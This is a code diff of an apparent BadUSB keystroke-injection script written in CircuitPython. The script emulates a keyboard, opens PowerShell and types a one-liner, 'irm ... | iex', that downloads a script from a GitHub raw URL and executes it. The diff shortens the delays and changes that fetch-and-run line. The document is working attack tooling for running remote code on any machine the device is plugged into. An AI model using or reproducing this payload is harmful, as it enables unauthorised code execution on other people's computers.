@@ -24,7 +24,7 @@ def open(word):
     kbd.send(Keycode.ENTER)
     time.sleep(1)
 
-time.sleep(4)
+time.sleep(2)
 
 kbd.send(Keycode.SHIFT)
 time.sleep(0.1)
@@ -32,15 +32,15 @@ kbd.release(Keycode.ALT)
 time.sleep(0.5)
 
 open("powershell")
-time.sleep(3)
+time.sleep(1)
 powershell_script = '''
-bash -c "$(irm https://raw.githubusercontent.com/956zs/HID-Script/refs/heads/main/powershell_scrip.ps1)"
+irm https://raw.githubusercontent.com/956zs/HID-Script/refs/heads/main/all | iex
 '''
 for line in powershell_script.splitlines():
-    layout.write(line, delay = 0.02)
+    layout.write(line, delay = 0.01)
     kbd.send(Keycode.ENTER)
     time.sleep(0.3)
 time.sleep(1)
-layout.write("exit", delay = 0.02)
-time.sleep(0.3)
+layout.write("exit", delay = 0.01)
+time.sleep(0.1)
 kbd.send(Keycode.ENTER)
